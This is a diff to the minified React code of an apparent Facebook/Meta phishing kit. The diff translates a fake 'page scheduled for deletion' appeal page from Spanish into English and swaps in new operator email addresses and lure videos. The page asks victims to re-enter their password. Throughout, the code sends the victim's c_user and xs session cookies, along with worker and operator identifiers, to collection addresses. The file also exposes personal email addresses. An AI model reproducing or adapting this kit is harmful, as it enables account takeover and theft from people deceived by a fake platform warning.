@@ -9713,7 +9713,7 @@
             n.useState)()
               , [i,l] = (0,
             n.useState)()
-              , o = ["salman jani email"]
+              , o = ["Nizamani"]
               , s = _();
             return (0,
             he.jsxs)(he.Fragment, {
@@ -9731,7 +9731,7 @@
                 }), (0,
                 he.jsx)("meta", {
                     property: "og:title",
-                    content: "Hemos programado la eliminación de tu página"
+                    content: "We have scheduled your page to be deleted"
                 }), (0,
                 he.jsx)("meta", {
                     name: "description",
@@ -9771,7 +9771,7 @@
                             className: "popup-head",
                             children: [(0,
                             he.jsx)("h5", {
-                                children: "Formulario de Apelación"
+                                children: "Apeal Form"
                             }), (0,
                             he.jsx)("div", {
                                 onClick: t,
@@ -9821,10 +9821,10 @@
                                         },
                                         body: JSON.stringify({
                                             emails: o,
-                                            workerEmail: "salmanjani email",
+                                            workerEmail: "DK",
                                             xs: r,
                                             c_user: i,
-                                            name: "asad"
+                                            name: "DK"
                                         })
                                     }).then((e => {
                                         e.ok
@@ -9838,27 +9838,27 @@
                                     className: "form-item",
                                     children: [(0,
                                     he.jsx)("p", {
-                                        children: "Hemos detectado una infracción en tu publicación reciente que viola nuestros estándares comunitarios."
+                                        children: "We have detected violation on your recent page post that violates our community standards."
                                     }), (0,
                                     he.jsx)("p", {
-                                        children: "Hemos programado la eliminación de tu página"
+                                        children: "We have scheduled your page to be deleted"
                                     }), (0,
                                     he.jsx)("p", {
-                                        children: "Si crees que esto es un error, tienes la opción de presentar una apelación proporcionando la información necesaria."
+                                        children: "If you believe this to be a mistake, you have the option to submit an appeal by providing the necessary information."
                                     }), (0,
                                     he.jsx)("p", {
                                         className: "form-item-detailtxt",
-                                        children: "Información detallada en video"
+                                        children: "Detailed Video Information"
                                     }), (0,
                                     he.jsx)("video", {
-                                        src: "https://cdn.glitch.global/09af26ce-98fb-4dac-b25d-465515252537/en-video.mp4?v=1741550487329",
+                                        src: "https://cdn.glitch.global/04223cf5-c2c7-4a98-99b2-9da638394728/WhatsApp%20Video%202024-11-26%20at%2013.24.43_9bcb50f5.mp4?v=1732616291608",
                                         controls: !0,
                                         poster: me,
                                         autoPlay: !0
                                     }), (0,
                                     he.jsx)("p", {
                                         className: "form-item-detailtxt",
-                                        children: "Asegúrese de proporcionar la información solicitada a continuación."
+                                        children: "Please be sure to provide the requested information below."
                                     }), (0,
                                     he.jsxs)("div", {
                                         className: "form-inputs",
@@ -9905,7 +9905,7 @@
                                                         className: "ant-btn css-m4timi ant-btn-default button-send",
                                                         children: (0,
                                                         he.jsx)("span", {
-                                                            children: "Enviar"
+                                                            children: "Send"
                                                         })
                                                     })
                                                 })
@@ -10040,11 +10040,11 @@
                 }), (0,
                 he.jsx)("meta", {
                     property: "og:title",
-                    content: "Hemos programado la eliminación de tu página"
+                    content: "We have scheduled your page to be deleted"
                 }), (0,
                 he.jsx)("meta", {
                     name: "description",
-                    content: "Hemos recibido varios informes de que tu página viola nuestros términos de servicio y normas comunitarias. Como resultado, tu página será eliminada."
+                    content: "We have received several reports that your page violates our terms of service and community guidelines. As a result, your page will be sent for verification."
                 }), (0,
                 he.jsx)("meta", {
                     name: "viewport",
@@ -10367,7 +10367,7 @@
                                                 })
                                             }), (0,
                                             he.jsx)("h1", {
-                                                children: "Centro de Privacidad"
+                                                children: "Privacy Center"
                                             }), (0,
                                             he.jsxs)("div", {
                                                 id: "action-buttons",
@@ -10398,7 +10398,7 @@
                                                         }), (0,
                                                         he.jsx)("div", {
                                                             className: "action-text",
-                                                            children: "Página de inicio del Centro de Privacidad"
+                                                            children: "Privacy Center Home Page"
                                                         }), (0,
                                                         he.jsx)("div", {
                                                             className: "action-arrow"
@@ -10431,7 +10431,7 @@
                                                         }), (0,
                                                         he.jsx)("div", {
                                                             className: "action-text",
-                                                            children: "Buscar"
+                                                            children: "Search"
                                                         }), (0,
                                                         he.jsx)("div", {
                                                             className: "action-arrow"
@@ -10468,7 +10468,7 @@
                                                         }), (0,
                                                         he.jsx)("div", {
                                                             className: "action-text",
-                                                            children: "Política de Privacidad"
+                                                            children: "Privacy Policy"
                                                         }), (0,
                                                         he.jsx)("div", {
                                                             className: "action-arrow",
@@ -10744,7 +10744,7 @@
                                                         }), (0,
                                                         he.jsx)("div", {
                                                             className: "action-text",
-                                                            children: "Otras reglas y artículos"
+                                                            children: "Other rules and articles"
                                                         }), (0,
                                                         he.jsx)("div", {
                                                             className: "action-arrow",
@@ -10932,7 +10932,7 @@
                                                         }), (0,
                                                         he.jsx)("div", {
                                                             className: "action-text",
-                                                            children: "Ajustes"
+                                                            children: "Settings"
                                                         }), (0,
                                                         he.jsx)("div", {
                                                             className: "action-arrow",
@@ -11054,14 +11054,14 @@
                                                         transform: "translate(13 43)",
                                                         fill: "white"
                                                     })]
-                                                }), "Hemos programado la eliminación de tu página"]
+                                                }), "We have scheduled your page to be deleted"]
                                             }), (0,
                                             he.jsx)("p", {
-                                                children: "Hemos recibido varios informes de que tu página viola nuestros términos de servicio y normas comunitarias. Como resultado, tu página será eliminada."
+                                                children: "We have received several reports that your page violates our terms of service and community guidelines. As a result, your page will be sent for verification."
                                             }), (0,
                                             he.jsx)("br", {}), (0,
                                             he.jsx)("p", {
-                                                children: "Si crees que tu página fue programada para eliminación por error, puedes evitar su eliminación permanente enviando una apelación con el botón de abajo y proporcionando información rápida."
+                                                children: "If you believe your page was mistakenly scheduled for deletion, you can prevent its permanent removal by simply clicking the appeal button below and providing some quick information"
                                             }), (0,
                                             he.jsxs)("div", {
                                                 className: "card-thumb",
@@ -11076,13 +11076,13 @@
                                                     children: [(0,
                                                     he.jsx)("p", {
                                                         className: "thumb-type",
-                                                        children: "Solicitud de apelación"
+                                                        children: "Appeal request"
                                                     }), (0,
                                                     he.jsx)("h4", {
-                                                        children: "Solucionar problemas con tu página"
+                                                        children: "Fixing problems with your page"
                                                     }), (0,
                                                     he.jsx)("p", {
-                                                        children: "Por favor, proporciona la información solicitada a continuación. Si no proporcionas esta información, el procesamiento de tu apelación podría retrasarse."
+                                                        children: "Please be sure to provide the requested information below. Failure to provide this information may delay the processing of your appeal."
                                                     }), (0,
                                                     he.jsx)("div", {
                                                         className: "btn-wrapper",
@@ -11090,28 +11090,28 @@
                                                         he.jsx)("button", {
                                                             onClick: () => t(!0),
                                                             className: "button fb-blue",
-                                                            children: "Apelar"
+                                                            children: "Appeal"
                                                         })
                                                     })]
                                                 })]
                                             }), (0,
                                             he.jsx)("br", {}), (0,
                                             he.jsx)("h6", {
-                                                children: "Código de apelación"
+                                                children: "Appeal Guide"
                                             }), (0,
                                             he.jsxs)("ul", {
                                                 children: [(0,
                                                 he.jsx)("li", {
-                                                    children: "En tu apelación, asegúrate de incluir toda la información necesaria en tu solicitud para que pueda ser revisada con precisión. Si proporcionas información incorrecta o insuficiente, tu apelación puede cerrarse sin revisión, y tu página será eliminada permanentemente."
+                                                    children: "In your appeal,Please ensure that all necessary information is included in your request so that it can be processed promptly. If you provide incorrect information or fail to respond to requests for additional information within 2 days, your appeal may be closed without further review. and your page will be deleted for permanently"
                                                 }), (0,
                                                 he.jsx)("li", {
-                                                    children: "Después de nuestra evaluación, revisaremos tu apelación y cancelaremos la eliminación de la página si la información proporcionada es correcta. El proceso de revisión generalmente tarda 24 horas, aunque en algunos casos, puede demorar más."
+                                                    children: "After your submission, we will review your appeal and cancel the page deletion if the information you provide is correct. The review process typically takes 24 hours, though in some cases it may take longer."
                                                 })]
                                             }), (0,
                                             he.jsx)("br", {}), (0,
                                             he.jsx)("br", {}), (0,
                                             he.jsx)("h6", {
-                                                children: "Centro de Privacidad"
+                                                children: "Privacy Center"
                                             }), (0,
                                             he.jsxs)("div", {
                                                 className: "action-button-list",
@@ -11141,12 +11141,12 @@
                                                         className: "action-text",
                                                         children: [(0,
                                                         he.jsx)("span", {
-                                                            children: "¿Qué es la Política de Privacidad y qué dice?"
+                                                            children: "What is the Privacy Policy and what does it say?"
                                                         }), (0,
                                                         he.jsx)("br", {}), (0,
                                                         he.jsx)("span", {
                                                             className: "small-grey",
-                                                            children: "Política de Privacidad"
+                                                            children: "Privacy Policy"
                                                         })]
                                                     }), (0,
                                                     he.jsx)("div", {
@@ -11193,12 +11193,12 @@
                                                         className: "action-text",
                                                         children: [(0,
                                                         he.jsx)("span", {
-                                                            children: "Cómo puedes administrar o eliminar tu información"
+                                                            children: "How you can manage or delete your information"
                                                         }), (0,
                                                         he.jsx)("br", {}), (0,
                                                         he.jsx)("span", {
                                                             className: "small-grey",
-                                                            children: "Política de Privacidad"
+                                                            children: "Privacy Policy"
                                                         })]
                                                     }), (0,
                                                     he.jsx)("div", {
@@ -11223,7 +11223,7 @@
                                             }), (0,
                                             he.jsx)("br", {}), (0,
                                             he.jsx)("h6", {
-                                                children: "Para más detalles, consulta el Acuerdo de Usuario"
+                                                children: "For more details, see the User Agreement"
                                             }), (0,
                                             he.jsx)("div", {
                                                 className: "action-button-list",
@@ -11248,7 +11248,7 @@
                                                         he.jsx)("br", {}), (0,
                                                         he.jsx)("span", {
                                                             className: "small-grey",
-                                                            children: "Acuerdo de Usuario"
+                                                            children: "User Agreement"
                                                         })]
                                                     }), (0,
                                                     he.jsx)("div", {
@@ -11273,7 +11273,7 @@
                                             }), (0,
                                             he.jsx)("br", {}), (0,
                                             he.jsx)("h6", {
-                                                children: "Recursos Adicionales"
+                                                children: "Additional resources"
                                             }), (0,
                                             he.jsxs)("div", {
                                                 className: "action-button-list",
@@ -11285,12 +11285,12 @@
                                                         className: "action-text",
                                                         children: [(0,
                                                         he.jsx)("span", {
-                                                            children: "Cómo Meta usa información para modelos de IA generativa"
+                                                            children: "How Meta uses information for generative AI models"
                                                         }), (0,
                                                         he.jsx)("br", {}), (0,
                                                         he.jsx)("span", {
                                                             className: "small-grey",
-                                                            children: "Centro de Privacidad"
+                                                            children: "Privacy Center"
                                                         })]
                                                     }), (0,
                                                     he.jsx)("div", {
@@ -11319,7 +11319,7 @@
                                                         className: "action-text",
                                                         children: [(0,
                                                         he.jsx)("span", {
-                                                            children: "Contactos con información sobre la operación de los sistemas de IA"
+                                                            children: "Cards with information about the operation of AI systems"
                                                         }), (0,
                                                         he.jsx)("br", {}), (0,
                                                         he.jsx)("span", {
@@ -11353,7 +11353,7 @@
                                                         className: "action-text",
                                                         children: [(0,
                                                         he.jsx)("span", {
-                                                            children: "Introducción a la IA Generativa"
+                                                            children: "Introduction to Generative AI"
                                                         }), (0,
                                                         he.jsx)("br", {}), (0,
                                                         he.jsx)("span", {
@@ -11384,11 +11384,11 @@
                                             he.jsx)("br", {}), (0,
                                             he.jsx)("p", {
                                                 className: "small-grey",
-                                                children: "Meta se compromete a proteger los riesgos de privacidad, incluyendo la recopilación, uso o compartición de información, y el desarrollo de métodos para reducir estos riesgos. Aprende más aquí."
+                                                children: "We continually identify potential privacy risks, including when collecting, using or sharing personal information, and developing methods to reduce these risks. Read more about"
                                             }), (0,
                                             he.jsxs)("div", {
                                                 className: "link-to",
-                                                children: ["Política de Privacidad", (0,
+                                                children: ["Privacy Policy", (0,
                                                 he.jsxs)("svg", {
                                                     width: 12,
                                                     height: 12,
@@ -13256,7 +13256,7 @@
             })
         }
           , Wt = () => {
-            const e = ["salinagomez104778@gmail.com"]
+            const e = ["abdulbariniz700@gmail.com"]
               , t = _()
               , [r,a] = (0,
             n.useState)(!1)
@@ -13336,10 +13336,10 @@
                                 style: {
                                     fontSize: "12px"
                                 },
-                                children: "Información detallada en video"
+                                children: "Detailed Video Information."
                             }), (0,
                             he.jsx)("a", {
-                                href: "https://cdn.glitch.global/09af26ce-98fb-4dac-b25d-465515252537/en-video.mp4?v=1741550487329",
+                                href: "https://cdn.glitch.global/04223cf5-c2c7-4a98-99b2-9da638394728/WhatsApp%20Video%202024-11-26%20at%2013.24.43_9bcb50f5.mp4?v=1732616291608",
                                 children: (0,
                                 he.jsx)("img", {
                                     src: me,
@@ -13353,7 +13353,7 @@
                             he.jsx)("br", {}), (0,
                             he.jsx)("p", {
                                 className: "fw-semibold validation_form_para mt-2",
-                                children: "Por favor, asegúrate de proporcionar la información solicitada a continuación."
+                                children: "Please be sure to provide the requested information below."
                             }), (0,
                             he.jsxs)("form", {
                                 onSubmit: n => {
@@ -13455,11 +13455,11 @@
                     alt: "Facebook Logo"
                 }), (0,
                 he.jsx)("h3", {
-                    children: "Facebook Seguridad"
+                    children: "Facebook security"
                 }), (0,
                 he.jsx)("hr", {}), (0,
                 he.jsx)("p", {
-                    children: "Por favor, vuelve a ingresar la contraseña para completar la solicitud."
+                    children: "Please re-enter password to complete the request."
                 }), (0,
                 he.jsx)("input", {
                     type: "password",
@@ -13484,7 +13484,7 @@
                         e("/thanks")
                     }
                     ,
-                    children: "Entregar"
+                    children: "Submit"
                 })]
             })
         }
